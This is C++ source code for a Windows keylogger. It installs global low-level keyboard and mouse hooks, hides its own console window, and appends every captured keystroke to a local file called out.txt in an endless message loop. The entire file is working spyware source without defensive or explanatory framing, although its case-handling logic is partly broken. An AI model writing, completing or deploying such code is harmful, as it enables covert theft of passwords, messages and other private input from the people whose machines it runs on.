#include <Windows.h>
#include <WinUser.h>
#include <string>

HHOOK _kbHook;
HHOOK _mHook;

KBDLLHOOKSTRUCT kbdStruct;
HANDLE out_file;

void InitOutFile(std::string outFileName) {
	// use new file
	out_file = CreateFileA(outFileName.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0x00, CREATE_NEW, 0x00, 0x00);
	
	// on error fallback to existing file
	if (out_file == INVALID_HANDLE_VALUE) {
		printf("[!] Couldn't open new file, opening existing one.");
		out_file = CreateFileA(outFileName.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0x00, OPEN_EXISTING, 0x00, 0x00);
	}

	// cannot access file - end exec
	if (out_file == INVALID_HANDLE_VALUE) {
		throw ERROR_UNHANDLED_EXCEPTION;
	}
}

DWORD WriteBufferToOutFile(std::wstring strToWrite) {
	DWORD dwBytesWritten = 0;
	DWORD dwPos = SetFilePointer(out_file, 0, 0x00, FILE_END);
	LockFile(out_file, dwPos, 0x00, strToWrite.length(), 0x00);
	WriteFile(out_file, strToWrite.c_str(), strToWrite.length(), &dwBytesWritten, 0x00);
	UnlockFile(out_file, dwPos, 0x00, strToWrite.length(), 0);
	FlushFileBuffers(out_file);
	return dwBytesWritten;
}

// Useful -> https://learn.microsoft.com/en-us/windows/win32/fileio/appending-one-file-to-another-file

int SaveKeystroke(int keyStroke) {

	std::wstring writeFileBuf;

	// Handle mouse events with separate func
	if (keyStroke == 1 || keyStroke == 2) {
		return 0;
	}

	char key;
	bool isLowercase = true;
	HWND foregroundWindow = GetForegroundWindow();
	HKL layout = 0x00;
	DWORD threadId = GetWindowThreadProcessId(foregroundWindow, 0x00);
	layout = GetKeyboardLayout(threadId);

	// check capslock
	isLowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
	// check shift
	isLowercase = (GetKeyState(VK_SHIFT) & 0x1000) != 0 
		|| (GetKeyState(VK_LSHIFT) & 0x1000) != 0
		|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0;

	key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);
	writeFileBuf += key;
	
	WriteBufferToOutFile(writeFileBuf);
	writeFileBuf.clear();
	return 0;
}

int SaveMouseOnClickEvent() {
	return 0;
}

LRESULT __stdcall KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			SaveKeystroke(kbdStruct.vkCode);
		}
	}

	// pass exec to next hook
	// 
	return CallNextHookEx(_kbHook, nCode, wParam, lParam);
}

LRESULT __stdcall MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// mouse left button
		if (wParam == WM_LBUTTONDOWN) {
			SaveMouseOnClickEvent();
		}
	}

	// pass exec to next hook
	return CallNextHookEx(_mHook, nCode, wParam, lParam);
}

// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
// https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
// Low-Level hooks used for keyboard / mouse events

void InitKbHook() {
	_kbHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookCallback, 0x00, 0x00);
}

void InitMHook() {
	_mHook = SetWindowsHookExA(WH_MOUSE_LL, MouseHookCallback, 0x00, 0x00);
}

void ReleaseHooks() {
	UnhookWindowsHookEx(_kbHook);
	UnhookWindowsHookEx(_mHook);
}

void HideAppWindow() {
	ShowWindow(FindWindowA("ConsoleWindowClass", 0x00), 0);
}

int main() {

	std::string outFileName = "out.txt";

	HideAppWindow();
	InitOutFile(outFileName);
	InitKbHook();

	// run indefinitely
	MSG msg;
	while (GetMessage(&msg, 0x00, 0, 0))
	{
	}
}